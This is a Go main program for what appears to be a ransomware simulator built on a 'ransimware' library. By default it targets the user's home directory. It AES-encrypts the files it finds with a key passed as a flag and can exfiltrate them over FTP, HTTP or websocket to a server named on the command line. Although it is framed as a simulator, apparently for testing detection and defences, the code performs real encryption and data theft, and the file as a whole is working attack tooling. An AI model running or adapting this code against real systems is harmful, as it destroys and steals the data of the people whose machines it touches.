package main

import (
	"os"
	"strings"
	"time"

	"github.com/mjwhitta/cli"
	"github.com/mjwhitta/errors"
	"github.com/mjwhitta/log"
	rw "github.com/mjwhitta/ransimware"
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			if flags.verbose {
				panic(r.(error).Error())
			}
			log.ErrX(Exception, r.(error).Error())
		}
	}()

	var e error
	var home string
	var paths []string
	var sim *rw.Simulator

	validate()

	// Get list of targets
	paths = cli.Args()
	if cli.NArg() == 0 {
		if home, e = os.UserHomeDir(); e != nil {
			panic(e)
		}

		paths = []string{home}
	}

	// Create simulator
	sim = rw.New(flags.threads)
	sim.WaitEvery = time.Duration(flags.waitEvery) * time.Second
	sim.WaitFor = time.Duration(flags.waitFor) * time.Second

	if flags.encrypt != "" {
		sim.Encrypt = func(fn string, b []byte) ([]byte, error) {
			println(fn)
			return rw.AESEncrypt(flags.encrypt)(fn, b)
		}
	}

	if flags.exfil != "" {
		sim.ExfilFilenames = flags.names
		sim.ExfilThreshold = flags.threshold

		if strings.HasPrefix(flags.exfil, "ftp") {
			sim.Exfil, e = rw.FTPParallelExfil(
				flags.exfil,
				"ftptest",
				"ftptest",
			)
		} else if strings.HasPrefix(flags.exfil, "http") {
			sim.Exfil, e = rw.HTTPExfil(flags.exfil, nil)
		} else if strings.HasPrefix(flags.exfil, "ws") {
			sim.Exfil, e = rw.WebsocketParallelExfil(flags.exfil, nil)
		} else {
			e = errors.Newf("unknown exfil protocol: %s", flags.exfil)
		}
		if e != nil {
			panic(e)
		}
	}

	// Add targets
	for _, path := range paths {
		if e = sim.Target(path); e != nil {
			panic(e)
		}
	}

	// Start simulator
	if e = sim.Run(); e != nil {
		panic(e)
	}
}
